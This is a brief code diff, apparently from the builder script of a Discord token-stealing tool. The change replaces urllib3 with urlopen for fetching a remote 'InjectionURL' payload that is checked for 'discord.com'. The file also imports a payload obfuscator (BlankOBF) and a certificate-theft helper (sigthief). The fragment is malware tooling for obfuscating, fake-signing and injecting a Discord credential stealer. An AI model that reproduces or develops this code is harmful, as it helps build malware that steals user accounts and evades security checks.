@@ -1,11 +1,11 @@
 import json
 import base64
 import os
-import urllib3
 import subprocess
 import random
 import string
 
+from urllib.request import urlopen
 import BlankOBF as obfuscator
 from sigthief import outputCert
 
@@ -64,8 +64,7 @@ def ReadSettings() -> tuple[dict, str]:
             settings = json.load(file)
 
     try:
-        poolManager = urllib3.PoolManager()
-        injection = poolManager.request("GET", InjectionURL).data.decode().strip()
+        injection = urlopen(InjectionURL, timeout= 5).read().decode().strip()
         if not "discord.com" in injection:
             injection = None
     except Exception:
